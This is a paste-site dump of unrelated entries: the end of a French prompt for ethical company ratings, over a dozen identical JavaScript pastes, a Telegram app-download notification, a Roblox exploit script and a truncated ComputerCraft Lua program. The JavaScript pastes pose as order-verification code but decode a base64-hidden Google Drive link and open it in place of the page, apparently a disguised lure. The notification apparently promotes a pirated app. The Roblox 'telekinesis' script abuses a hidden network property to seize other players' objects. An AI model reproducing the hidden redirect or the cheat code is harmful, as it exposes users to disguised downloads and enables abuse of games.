        ---
 
        ### 3. Notation 
        Attribue une note à chacun des critères éthiques ci-dessus, selon l’échelle de 0 à 3 suivante :
        0 : Impact très négatif, grave, durable, global, volontaire et systémique.
        1 : Impact négatif ou neutre, limité dans le temps ou l’espace. Inclut greenwashing, actions anecdotiques ou non vérifiables (sources internes uniquement).
        2 : Impact positif mais partiel, limité ou différé. Basé sur des intentions, annonces, ou débuts d’actions concrètes.
        3 : Impact positif fort, concret, éthique, global et transformateur, avec un impact positif profond et durable.
 
Attribue pour chaque critère une note sur l'échelle 0 à 3 qui reflète au mieux l’information disponible. Le nombre doit être un entier parmi 0 1 2 ou 3 sans virgule. 

Si les données sont insuffisantes, attribue par défaut la note 1 et précise dans le commentaire qu’il s’agit d’une note indicative, en l'absence d'informations rendues publiques. 


Si le critère est sans objet étant donné la taille ou l'activité de l'entreprise et qu'il n'y a aucune informations à ce sujet la concernant, attribue une note vide """".
        ---
 
        ### 4. Format de réponse attendu : fichier JSON complet, téléchargeable
 
        Le fichier JSON doit contenir :
 
        - Les données générales de l’entreprise  
        - Une analyse pour **chaque critère**, composée de :
            - Un **commentaire** qui doit obligatoirement faire entre 600 et 800 caractères sauf quand aucune source n'a été trouvée. Il est bien rédigé avec des phrases bien écrite. Le ton est neutre et pas complaisant, il est objectif, les informations non vérifiées par des sources indépendantes extérieures sont données parfois au conditionnel. N'inclus pas de références aux sources (sous la forme []) à l'intérieur de ces textes. 
            - La **note attribuée**  
            - **1 à 5 sources** fiables (jamais inventées)
 
        #### Format JSON :
        ```json
        {{
            ""SECTEUR"": ""valeur"",
            ""ENTREPRISE"": ""valeur"",
            ""SITEWEB"": ""valeur"",
            ""Pays"": ""valeur"",
            ""Date de création"": ""valeur"",
            ""Groupe, Actionnaire"": ""valeur"",
            ""Nb de Salariés"": ""valeur"",
            ""Nb de GPU"": ""valeur"",
            ""Dernier C.A connu (en M€/$)"": ""##.#"",
            ""Dernier résultat connu (en M€/$)"": ""##.#"",
			""Capitaux levés (en M€/$)"": ""##.#"",
            ""CODE_CRITERE"": {{
                ""Commentaire"": ""mini 600 à 800 caractères (sauf si info indisponible)."",
                ""Note"": ""1"",
                ""sources"": [
                    {{
                        ""nom"": ""nom de la source 1"",
                        ""titre"": ""titre de l’article"",
                        ""url"": ""URL""
                    }},
                    {{
                        ""nom"": ""nom de la source 2"",
                        ""titre"": ""titre de l’article"",
                        ""url"": ""URL""
                    }}
                ]
            }}
        }}
        ```

        """""""
JDzWgWkx,Order.js,dentira,JavaScript,Monday 21st of April 2025 04:39:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72135/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HR18dsb8,Market.js,dentira,JavaScript,Monday 21st of April 2025 04:23:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93013/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eUUSUr6X,Notification,Vivek333,JSON,Monday 21st of April 2025 04:10:40 AM CDT,"{
  ""enabled"": true,
  ""title"": ""kinemaster Pro"",
  ""message"": ""Latest Version"",
   ""style"": ""inbox"",
""lines"": [""https://t.me/SATIKHELPS 1"", ""https://t.me/SATIKHELPS 2"", ""https://t.me/SATIKHELPS 3""],
  ""sound"": true,
  ""vibrate"": true,
  ""expires"": ""2025-05-01T12:00:00"",
  ""image"": ""http://alo0osh-sy.yn.lt/images/-.jpg"",
  ""actions"": [
    {
      ""title"": ""Download Now"",
      ""url"": ""https://t.me/SATIKHELPS""
    },
    {
      ""title"": ""Download""
    }
  ]
}"
jEyidBaU,Untitled,dentira,JavaScript,Monday 21st of April 2025 04:08:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18088/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GEnDuZKt,Products.js,dentira,JavaScript,Monday 21st of April 2025 03:53:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17668/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N4BTj0vE,Order.js,dentira,JavaScript,Monday 21st of April 2025 03:37:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24848/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7HeNWKbc,Market.js,dentira,JavaScript,Monday 21st of April 2025 03:22:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19726/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YnreyXah,FE Telekineses by Im_Patrick,Dark_Agent,Lua,Monday 21st of April 2025 03:21:00 AM CDT,"-- https://www.youtube.com/@Im_Patrick
local re=game:GetService(""Workspace"")
local sandbox=function(var,func)
	local env=getfenv(func)
	local newenv=setmetatable({},{
		__index=function(self,k)
			if k==""script"" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors={}
local _Name=""Telekinesis V6""
local uis=game:GetService(""UserInputService"")
local _Ins, _CF_new, _VTR_new=Instance.new, CFrame.new, Vector3.new
mas=_Ins(""Model"",game:GetService(""Lighting""))
local con=getfenv().sethiddenproperty
Tool0=_Ins(""Tool"")
Part1=_Ins(""Part"")
Script2=_Ins(""Script"")
local light=_Ins(""Highlight"", Tool0)
light.FillTransparency = 1
LocalScript3=_Ins(""LocalScript"")
re=game:GetService(""RunService"")
Tool0.Name=_Name
Tool0.Parent=mas
Tool0.Grip=_CF_new(0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Tool0.GripPos=_VTR_new(0, 0, 1)
Part1.Name=""Handle""
Part1.Parent=Tool0
local changed=""Changed""
Part1.CFrame=_CF_new(-3.5, 5.30000019, -3.5, 1, 0, 0, 0, -1, 0, 0, 0, -1)
Part1.Orientation=_VTR_new(0, 180, 180)
Part1.Position=_VTR_new(-3.5, 5.300000190734863, -3.5)
Part1.Rotation=_VTR_new(-180, 0, 0)
Part1.Color=Color3.new(0.972549, 0.972549, 0.972549)
Part1.Transparency=1
local cam=re.RenderStepped
local w=wait
Part1.Size=_VTR_new(1, 1, 1)
Part1.BottomSurface=Enum.SurfaceType.Smooth
Part1.BrickColor=BrickColor.new(""Institutional white"")
Part1.Locked=true
local speed=55
local mb=uis.TouchEnabled
Part1.TopSurface=Enum.SurfaceType.Smooth
Part1.brickColor=BrickColor.new(""Institutional white"")
Script2.Name=""LineConnect""
Script2.Parent=Tool0
light.Adornee=nil
local Sound=_Ins(""Sound"", game.Workspace)
Sound.SoundId=""rbxassetid://1092093337""
Sound:Play()
cam:Connect(function() if con then con(game:GetService(""Players"").LocalPlayer, changed, speed) end end)
table.insert(cors,sandbox(Script2,function()
	w()
	local check=script.Part2
	local part1=script.Part1.Value
	local part2=script.Part2.Value
	local parent=script.Par.Value
	local color=script.Color
	local line=_Ins(""Part"")
	line.TopSurface=0
	line.BottomSurface=0
	line.Reflectance=.5
	line.Name=""Laser""
	line.Locked=true
	line.CanCollide=false
	line.Anchored=true
	line.formFactor=0
	line.Size=_VTR_new(1,1,1)
	local mesh=_Ins(""BlockMesh"")
	mesh.Parent=line
	while true do
		if (check.Value==nil) then break end
		if (part1==nil or part2==nil or parent==nil) then break end
		if (part1.Parent==nil or part2.Parent==nil) then break end
		if (parent.Parent==nil) then break end
		local lv=_CF_new(part1.Position,part2.Position)
		local dist=(part1.Position-part2.Position).magnitude
		line.Parent=parent
		line.BrickColor=color.Value.BrickColor
		line.Reflectance=color.Value.Reflectance
		line.Transparency=color.Value.Transparency
		line.CFrame=_CF_new(part1.Position+lv.lookVector*dist/2)
		line.CFrame=_CF_new(line.Position,part2.Position)
		mesh.Scale=_VTR_new(.25,.25,dist)
		w()
	end
	line:remove()
	script:remove() 
end))
changed=""SimulationRadius""
Script2.Disabled=true
LocalScript3.Name=""MainScript""
LocalScript3.Parent=Tool0
table.insert(cors,sandbox(LocalScript3,function()
	w() 
	tool=script.Parent
	lineconnect=tool.LineConnect
	object=nil
	mousedown=false
	found=false
	BP=_Ins(""BodyPosition"")
	BP.maxForce=_VTR_new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge) --pwns everyone elses bodyposition
	BP.P=BP.P*3
	dist=nil
	point=_Ins(""Part"")
	point.Locked=true
	point.Anchored=true
	point.formFactor=0
	point.Shape=0
	point.BrickColor=BrickColor.Blue() 
	point.Size=_VTR_new(0,0,0)
	point.CanCollide=false
	local mesh=_Ins(""SpecialMesh"")
	mesh.MeshType=""Sphere""
	mesh.Scale=_VTR_new(.7,.7,.7)
	mesh.Parent=point
	handle=tool.Handle
	front=tool.Handle
	color=tool.Handle
	objval=nil
	local hooked=false 
	local hookBP=BP:clone() 
	hookBP.maxForce=_VTR_new(30000,30000,30000) 

	local LineConnect=function(part1,part2,parent)
		local p1=_Ins(""ObjectValue"")
		p1.Value=part1
		p1.Name=""Part1""
		local p2=_Ins(""ObjectValue"")
		p2.Value=part2
		p2.Name=""Part2""
		local par=_Ins(""ObjectValue"")
		par.Value=parent
		par.Name=""Par""
		local col=_Ins(""ObjectValue"")
		col.Value=color
		col.Name=""Color""
		local s=lineconnect:clone()
		s.Disabled=false
		p1.Parent=s
		p2.Parent=s
		par.Parent=s
		col.Parent=s
		s.Parent=workspace
		if (part2==object) then
			objval=p2
		end
	end

	local onButton1Down=function(mouse)
		if (mousedown==true) then return end
		mousedown=true
		coroutine.resume(coroutine.create(function()
			local p=point:clone()
			p.Parent=tool
			LineConnect(front,p,workspace)
			while (mousedown==true) do
				p.Parent=tool
				if (object==nil) then
					if (mouse.Target==nil) then
						local lv=_CF_new(front.Position,mouse.Hit.p)
						p.CFrame=_CF_new(front.Position+(lv.lookVector*1000))
					else
						p.CFrame=_CF_new(mouse.Hit.p)
					end
				else
					LineConnect(front,object,workspace)
					break
				end
				w()
			end
			p:remove()
		end))
		while (mousedown==true) do
			if (mouse.Target~=nil) then
				local t=mouse.Target
				if (t.Anchored==false) then
					object=t
					light.Adornee=object
					dist=(object.Position-front.Position).magnitude
					break
				end
			end
			w()
		end
		while (mousedown==true) do
			if (object.Parent==nil) then break end
			local lv=_CF_new(front.Position,mouse.Hit.p)
			BP.Parent=object
			BP.position=front.Position+lv.lookVector*dist
			w()
		end
		BP:remove()
		object=nil
		objval.Value=nil
		light.Adornee=nil
	end

	local onKeyDown=function(key,mouse) 
		local key=key:lower() 
		local yesh=false 
		if (key==""q"") then 
			if (dist>=5) then 
				dist=dist-5 
			end 
		end
		if (key==""u"") then 
			if (dist ~=1) then 
				BX=_Ins(""BodyGyro"")
				BX.MaxTorque=_VTR_new(math.huge,0,math.huge)
				BX.CFrame=BX.CFrame * CFrame.Angles(0, math.rad(45), 0)
				BX.D=0
				BX.Parent=object
				--object.CFrame=CFrame.Angles(math.rad(90), 0,0) -- not used
				--object.Orientation=_VTR_new(50,0,0)
				--BX.Orientation=_VTR_new(23,0,0)
			end 
		end 
		if (key==""p"") then 
			if (dist ~=1) then
				BX=_Ins(""BodyVelocity"")
				BX.maxForce=_VTR_new(0,math.huge,0)
				BX.velocity=_VTR_new(0,1,0)
				--BX.CFrame=BX.CFrame * CFrame.Angles(0, math.rad(45), 0)
				BX.Parent=object
			end 
		end 
		if key == ""l"" then 
			if (object==nil) then return end 
			for _,v in pairs(object:children()) do 
				if v.className == ""BodyGyro"" then 
					return nil 
				end 
			end 
			BG=_Ins(""BodyGyro"") 
			BG.maxTorque=_VTR_new(math.huge,math.huge,math.huge) 
			BG.cframe=_CF_new(object.CFrame.p) 
			BG.Parent=object 
			repeat w() until(object.CFrame == _CF_new(object.CFrame.p))
			BG.Parent=nil 
			if (object==nil) then return end 
			for _,v in pairs(object:children()) do 
				if v.className == ""BodyGyro"" then 
					v.Parent=nil 
				end 
			end 
			object.Velocity=_VTR_new(0,0,0) 
			object.RotVelocity=_VTR_new(0,0,0) 
		end 
		if (key==""y"") then 
			if (dist ~=100) then 
				dist=100 
			end 
		end 
		if (key==""j"") then 
			if (dist~=5000) then 
				dist=5000 
			end 
		end
		if (key==""e"") then
			dist=dist+5
		end
		if (key==""x"") then 
			if dist ~= 15 then 
				dist=15 
			end 
		end 
	end
	local onEquipped=function(mouse)
		keymouse=mouse
		local char=tool.Parent
		human=char.Humanoid
		human.Changed:connect(function() if (human.Health==0) then mousedown=false BP:remove() point:remove() tool:remove() end end)
		mouse.Button1Down:connect(function() onButton1Down(mouse) end)
		mouse.KeyDown:connect(function(key) onKeyDown(key,mouse) end)
		if mb then
			uis.TouchLongPress:Connect(function() onKeyDown(""y"",mouse) end)
			uis.TouchEnded:Connect(function() mousedown=false end)
		else
			mouse.Button1Up:connect(function() mousedown=false end)
		end
	end
	tool.Equipped:connect(onEquipped)
	tool.Unequipped:connect(function() mousedown=false end)
end))
for i,v in pairs(mas:GetChildren()) do
	v.Parent=game:GetService(""Players"").LocalPlayer.Backpack
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
--https://www.youtube.com/@Im_Patrick"
zE8nBugJ,Untitled,dentira,JavaScript,Monday 21st of April 2025 03:06:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46040/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QNm8iami,Products.js,dentira,JavaScript,Monday 21st of April 2025 02:51:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40852/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
s28sX9Ws,Order.js,dentira,JavaScript,Monday 21st of April 2025 02:35:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67436/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BDhUSp7J,Market.js,dentira,JavaScript,Monday 21st of April 2025 02:20:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75840/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1V1RJ2HV,Untitled,dentira,JavaScript,Monday 21st of April 2025 02:04:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25452/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YRh5PqLQ,Products.js,dentira,JavaScript,Monday 21st of April 2025 01:49:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21451/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
w3wittQi,Order.js,dentira,JavaScript,Monday 21st of April 2025 01:34:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fXLxQmpe,激光扫描发射器 水平跳船 投屏 v5,jaklsfjlsak,Lua,Monday 21st of April 2025 01:22:46 AM CDT,"-- Laser‑Guided Warp System (“ztc”) with H/I/O prompts and O‑key to run otc

-- 1) Wrap terminal + any attached monitors
local screens = {}

-- Terminal wrapper
table.insert(screens, {
  clear              = function() term.clear(); term.setCursorPos(1,1) end,
  getSize            = function() return term.getSize() end,
  setTextColor       = term.setTextColor,
  setBackgroundColor = term.setBackgroundColor,
  setCursorPos       = term.setCursorPos,
  write              = term.write,
})

-- Monitor wrappers
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""monitor"" then
    local m = peripheral.wrap(side)
    table.insert(screens, {
      clear              = function() m.clear(); m.setCursorPos(1,1) end,
      getSize            = function() return m.getSize() end,
      setTextColor       = function(c) m.setTextColor(c) end,
      setBackgroundColor = function(c) m.setBackgroundColor(c) end,
      setCursorPos       = function(x,y) m.setCursorPos(x,y) end,
      write              = function(txt) m.write(txt) end,
      monitor            = m,
    })
  end
end

-- 2) Auto‑scale monitors so at least 7 lines will fit
for _, s in ipairs(screens) do
  if s.monitor then
    local best = 0.5
    for _, scale in ipairs({1, 0.5}) do
      s.monitor.setTextScale(scale)
      local w,h = s.getSize()
      if w >= 40 and h >= 7 then
        best = scale
        break
      end
    end
    s.monitor.setTextScale(best)
  end
end

-- 3) Helpers
local function forAll(fn) for _,s in ipairs(screens) do fn(s) end end

-- Clear every screen to lightGray
local function clearAll()
  forAll(function(s)
    s.setTextColor(colors.black)
    s.setBackgroundColor(colors.lightGray)
    s.clear()
  end)
end

-- 4) Static texts
local titleText     = ""Laser Guided Warp System""
local subtitleText  = ""Emit Scanning Laser to Warp""
local offsetText    = ""Mining Laser Offset ( I ): ""
local proximityText = ""3D Proximity Offset ( O ): ""
local promptH       = ""Press H for Main Menu""
local promptI       = ""Press I to Toggle Laser Miner Offset""
local promptO       = ""Press O to Toggle 3D Proximity Offset""

-- Draw title, subtitle, offset‑state and proximity‑state lines
local function drawStatic()
  forAll(function(s)
    local w,_ = s.getSize()
    -- Title (line 1): white on black
    local xT = math.floor((w - #titleText)/2) + 1
    s.setTextColor(colors.white)
    s.setBackgroundColor(colors.black)
    s.setCursorPos(xT,1)
    s.write(titleText)

    -- Subtitle (line 3): black on lightGray
    local xS = math.floor((w - #subtitleText)/2) + 1
